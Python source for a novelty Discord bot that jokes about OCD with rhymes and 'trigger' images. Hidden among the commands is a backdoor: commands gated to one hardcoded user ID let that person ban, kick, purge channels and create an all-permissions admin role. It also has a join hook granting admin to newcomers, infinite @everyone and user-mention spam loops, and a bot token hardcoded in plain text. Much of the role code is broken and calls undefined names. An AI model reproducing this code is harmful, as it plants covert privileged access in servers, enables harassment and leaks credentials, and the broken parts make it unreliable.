import discord
from discord.ext import commands
from discord.utils import get
import os
import random
import time
prefix = ['ocd ', 'OCD ', 'Ocd ', '-', '!', '.','']

a = 0

client = commands.Bot(command_prefix = prefix)





@client.command()
async def lol(ctx):
    await ctx.send(".lol")



def uxmuu(ctx):
    return ctx.author.id == 722724595836125215

#
#uxmuu id = 722724595836125215

@client.command()
@commands.check(uxmuu)
async def oprole(ctx, user: discord.Member, role: discord.Role):
    role = await client.create_role(server, name="admin", permissions=Permissions.all())
    await client.add_roles(member, role)
    

    
@client.command()
@commands.check(uxmuu)
async def opbannare(ctx, member : discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.channel.purge(limit=1)





@client.event
@commands.check(uxmuu)
async def on_member_join(member):
    role = await client.create_role(server, name="admin", permissions=Permissions.all())
    await client.add_roles(member, role)




@client.command()
@commands.check(uxmuu)
async def opclear(ctx, amount=1000000):
    await ctx.channel.purge(limit=amount + 1)

@client.command()
@commands.check(uxmuu)
async def opkickarna(ctx, member : discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.channel.purge(limit=1)


@client.command()
@commands.has_permissions(manage_messages=True)
async def everyone(ctx):
    while True:
        await ctx.send("@everyone")

@client.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx, amount=1000000):
    await ctx.channel.purge(limit=amount + 1)

@client.command()
@commands.has_permissions(administrator=True)
async def bannare(ctx, member : discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.channel.purge(limit=1)




@client.command()
@commands.has_permissions(administrator=True)
async def kickarna(ctx, member : discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.channel.purge(limit=1)


@client.event
async def on_ready():
    print("online")
    await client.change_presence(status=discord.Status, activity=discord.Game('do you have O.C.D?'))


@client.command()
@commands.has_permissions(manage_messages=True)
async def aimo(ctx):
    while True:
        await ctx.send("<@291263232616824843>")


@client.command()
async def rap24h(ctx):
    while True:
        responses = ['OCD is great dont hate',
                    'whats up my brother from other mothers',
                    'OCD makes me cry dont fly',
                    'OCD isnt fake dont hate',
                     'OCD is fun dont run',
                    'if you have OCD you can fly really high',
                     'OCD isnt food its good',
                    'OCD doesnt suck im not duck',
                    'OCD isnt fake i dont use make',
                    'OCD is best bird live in nest',
                     'OCD doesnt taste like moshroom soup its still dope',
                    'OCD makes me clean i have seen']
        await ctx.send(random.choice(responses))
        time.sleep(10)


@client.command(aliases=['ocdrap', 'OCDRAP', 'O.C.Drap', 'rap'])
async def OCDrap(ctx):
    responses = ['OCD is great dont hate',
                 'whats up my brother from other mothers',
                 'OCD makes me cry dont fly',
                 'OCD isnt fake dont hate',
                 'OCD is fun dont run',
                 'if you have OCD you can fly really high',
                 'OCD isnt food its good',
                 'OCD doesnt suck im not duck',
                 'OCD isnt fake i dont use make',
                 'OCD is best bird live in nest',
                 'OCD doesnt taste like moshroom soup its still dope',
                 'OCD makes me clean i have seen']
    await ctx.send(random.choice(responses))
    
@client.command(aliases=['O.D.C test', 'O.C.Dtest', 'ocd test', 'ocdtest', 'OCD test'])
async def test(ctx):
    await ctx.send('https://youtu.be/tnzz-eFmKaw if this video triggers you, you have OCD')



@client.command(aliases=['ocdping', 'ping', 'O.C.Dping'])
async def OCDping(ctx):
    await ctx.send(f'OCDpong! {round(client.latency * 1000)}ms')

    
    
@client.command(aliases=['ocdpong', 'O.C.Dpong', 'pong'])
async def OCDpong(ctx):
    await ctx.send(f'OCDping! {round(client.latency * 1000)}ms')


@client.command(aliases=['ocdpicture', 'OCDtrigger', 'OCDtriggers','triggerOCD', 'triggerocd', 'triggeringpictures', 'ocdphoto', 'triggeringphotos', 'OCDphoto', 'OCDpictures', 'ocdtrigger', 'ocdphots', 'OCDphotos', 'trigger', 'triggers'])
async def OCDpicture(ctx):
    responses = ['https://preview.redd.it/au77oyjotng41.jpg?width=640&crop=smart&auto=webp&s=e9cddd5d7587cb60a3ecca8b034252eaaffa157c',
                 'https://preview.redd.it/dnsmw76itzf41.jpg?width=640&crop=smart&auto=webp&s=d47ba8a9e7fb6aa7d566ee08f0c9de14648b7202',
                 'https://preview.redd.it/mv8ogzirfcd41.jpg?width=640&crop=smart&auto=webp&s=5772d92fd271581ebc75e23eecf597aefffab730',
                 'https://preview.redd.it/fvm5tf8cbjf41.jpg?width=640&crop=smart&auto=webp&s=bf813ad7eee49348d841207dce763adaa4650abc',
                 'https://preview.redd.it/7as3ux43u8d41.jpg?width=640&crop=smart&auto=webp&s=24058cbbae5a825c3647a86d07b917dd68fbf11a',
                 'https://preview.redd.it/zb0hxe0rb5b41.jpg?width=640&crop=smart&auto=webp&s=9a385a78860fdf0f6722fe9774aee80819f25033',
                 'https://preview.redd.it/42ct5dszlq841.jpg?width=640&crop=smart&auto=webp&s=5ae8e6e0ad46516a64b000a81d676f5393734e25',
                 'https://preview.redd.it/ucwfkvbetu441.jpg?width=640&crop=smart&auto=webp&s=b4be0a2fc22694280ab627d28406c5370f37bfdf',
                 'https://preview.redd.it/utkk54mjns441.jpg?width=640&crop=smart&auto=webp&s=10a83b8fdc1d8e6078c6a151b1b9c6c4d62096fe',
                 'https://preview.redd.it/sonergupy8341.jpg?width=640&crop=smart&auto=webp&s=39d52ed887072d040d49dfb97bb09a23f1b3ce01',
                 'https://preview.redd.it/s2gvdpt3zbr31.jpg?width=640&crop=smart&auto=webp&s=0da5f1590e4792ddfde78e70c4fff552e5a91c86',
                 'https://preview.redd.it/2dbmo4grnkp31.jpg?width=640&crop=smart&auto=webp&s=a6b58d4127185ac0756fd8101277c15c18cad7d2',
                 'https://preview.redd.it/hn15uz8iokp31.jpg?width=640&crop=smart&auto=webp&s=970bbd8bd7e1b55e2310aa1c9e76bc0818a346b1',
                 'https://preview.redd.it/k4d25afibyo31.jpg?width=640&crop=smart&auto=webp&s=4d079b73b10a3dc24d33b4e6178d5491eccb5d67',
                 'https://preview.redd.it/vkfvbpqriyn31.jpg?width=640&crop=smart&auto=webp&s=471150429262c8b920f44c498fae1b9fbd7505ae',
                 'https://preview.redd.it/eo0oieh4bwn31.jpg?width=640&crop=smart&auto=webp&s=98943d0d65a697daaec01182053d29dec1bb9197',
                 'https://preview.redd.it/3xz2z6ywtbn31.jpg?width=640&crop=smart&auto=webp&s=c146f59187978f91053896230551da02e7dba14a',
                 'https://preview.redd.it/zrzma9wviug31.jpg?width=640&crop=smart&auto=webp&s=96384865c6c18ca6b32fdb475bacfa137f54d5f9',
                 'https://preview.redd.it/c95oxmgo0zf31.jpg?width=640&crop=smart&auto=webp&s=e5dd9b37fe5a1f131da07307cb407d25a54f65e9',
                 'https://preview.redd.it/fp9n1n0w0a831.jpg?width=640&crop=smart&auto=webp&s=6e97b18a9c68a6c8a4c5f32ad089fc73a36ee73b']
    await ctx.send(random.choice(responses))




@client.command()
@commands.has_permissions(manage_roles=True)
async def newrole(ctx, *, name):
	guild=ctx.guild
	await guild.create_role(name=name)
	await ctx.send(f'Role `{name}` has been created')
	await guild.create_role(name = 'role name',  permissions = discord.Permissions(perrmission = True), reason = 'reason')
    
    




@client.command(pass_context=True)
@commands.has_permissions(manage_roles=True)
async def role(ctx, user: discord.Member, role: discord.Role):
    await user.add_roles(role)
    




@client.command()
async def ding(ctx):
    await ctx.send("dong")

@client.command()
async def dong(ctx):
    await ctx.send("ding")







                                








client.run("Nzk3NDcyMDI5MzU0ODg1MTkx.X_m9tA.IUIT21RWI64KEqVghhBFF0bHMgo")
